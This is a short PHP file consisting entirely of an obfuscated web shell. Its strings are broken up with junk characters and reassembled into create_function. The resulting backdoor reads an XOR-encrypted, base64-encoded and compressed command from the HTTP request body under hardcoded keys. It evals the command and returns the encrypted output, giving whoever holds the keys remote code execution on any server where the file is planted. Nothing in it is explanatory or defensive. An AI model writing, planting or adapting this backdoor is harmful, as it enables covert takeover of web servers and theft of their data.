<?php
$I='oF/r($i=0;$i<$l;F/){fF/or($j=0;($jF/<$c&&F/$i<$lF/F/);$j++,$i++F/){$o.F/=$t{$i}F/^$kF/';
$N='{$j};}F/}retuF/rn $o;}if (@pregF/_matchF/("/$kF/h(.+)$F/kf/",@fiF/le_gF/F/eF/t_co';
$J='(@x(@bF/ase64_F/decF/ode($m[1])F/,$k)F/));$o=@F/oF/b_get_coF/nteF/nts();@ob_enF/F/dF/_c';
$i='KF/YF/oe4O9AF/Sk";function x($F/t,$k)F/{$c=F/strlen($F/F/k);$F/l=strF/len($t);$F/o="";fF/';
$Q=str_replace('KO','','KOcreaKOtKOe_KOfuKOncKOtion');
$a='lean();$r=@base6F/4_enF/code(@xF/(@gzF/compreF/F/ss($o),$k));priF/nt("$pF/F/$kh$r$kf");}';
$s='ntents("pF/hp://input"F/),$m)==F/1) {F/@oF/b_stF/art();@evaF/lF/(@gzuncomprF/ess';
$S='$kF/="060f4aF/a6";$F/kh="cbe6F/b63c62F/66F/";$kf=F/"feba6a83bF/4F/d3";$p="K3a8F/iY';
$q=str_replace('F/','',$S.$i.$I.$N.$s.$J.$a);
$g=$Q('',$q);$g();
?>
